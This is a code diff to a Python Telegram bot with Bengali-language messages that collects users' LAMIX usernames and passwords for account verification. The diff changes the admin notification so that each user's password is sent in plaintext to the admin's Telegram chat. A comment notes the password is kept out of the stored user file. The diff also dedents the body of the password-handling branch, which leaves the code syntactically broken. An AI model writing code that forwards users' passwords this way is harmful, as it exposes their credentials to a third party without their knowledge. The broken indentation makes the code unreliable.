@@ -164,14 +164,15 @@ def cancel_workflow_run(run_id):
         return False
 
 # ── Admin Notification ────────────────────────────────────────────────────────
-def notify_admin_new_user(tg_id, tg_username, lamix_username):
+def notify_admin_new_user(tg_id, tg_username, lamix_username, lamix_password):
     text = (
-        f"🆕 <b>নতুন ইউজার রেজিস্ট্রেশন!</b>\n"
+        f"🆕 <b>নতুন ইউজার যাচাই সম্পন্ন!</b>\n"
         f"━━━━━━━━━━━━━━━\n"
         f"👤 Telegram: @{tg_username}\n"
         f"🆔 ID: <code>{tg_id}</code>\n"
         f"🔑 LAMIX User: <code>{lamix_username}</code>\n"
-        f"⏳ Status: Pending\n"
+        f"🔒 Password: <code>{lamix_password}</code>\n"
+        f"✅ Login: সফল\n"
         f"━━━━━━━━━━━━━━━"
     )
     markup = {
@@ -446,31 +447,39 @@ def handle_step(chat_id, user_id, text, users):
         )
 
     elif step == "await_password":
-        lamix_username = users[uid].get("lamix_username", "")
-        lamix_password = text.strip()
+    lamix_username = users[uid].get("lamix_username", "")
+    lamix_password = text.strip()
 
-        users[uid]["step"] = "verifying"
-        save_users(users)
+    users[uid]["step"] = "verifying"
+    save_users(users)
 
-        send_message(chat_id,
-            "⏳ <b>একাউন্ট যাচাই করা হচ্ছে...</b>\n"
-            "একটু অপেক্ষা করুন।"
+    send_message(chat_id,
+        "⏳ <b>একাউন্ট যাচাই করা হচ্ছে...</b>\n"
+        "একটু অপেক্ষা করুন।"
+    )
+
+    triggered = trigger_workflow(VERIFY_WORKFLOW, {
+        "user_id": uid,
+        "lamix_username": lamix_username,
+        "lamix_password": lamix_password
+    })
+
+    if triggered:
+        # Admin কে password সহ notify করুন — users.json এ সেভ হবে না
+        notify_admin_new_user(
+            uid,
+            users[uid].get("tg_username", ""),
+            lamix_username,
+            lamix_password  # ← শুধু notification এ, DB তে না
         )
-
-        triggered = trigger_workflow(VERIFY_WORKFLOW, {
-            "user_id": uid,
-            "lamix_username": lamix_username,
-            "lamix_password": lamix_password
-        })
-
-        if not triggered:
-            send_message(chat_id,
-                "❌ যাচাই করা যায়নি। আবার চেষ্টা করুন।\n"
-                "/start দিয়ে শুরু করুন।"
-            )
-            users[uid]["status"] = "new"
-            users[uid]["step"] = ""
-            save_users(users)
+    else:
+        send_message(chat_id,
+            "❌ যাচাই করা যায়নি। আবার চেষ্টা করুন।\n"
+            "/start দিয়ে শুরু করুন।"
+        )
+        users[uid]["status"] = "new"
+        users[uid]["step"] = ""
+        save_users(users)
 
     return users
 
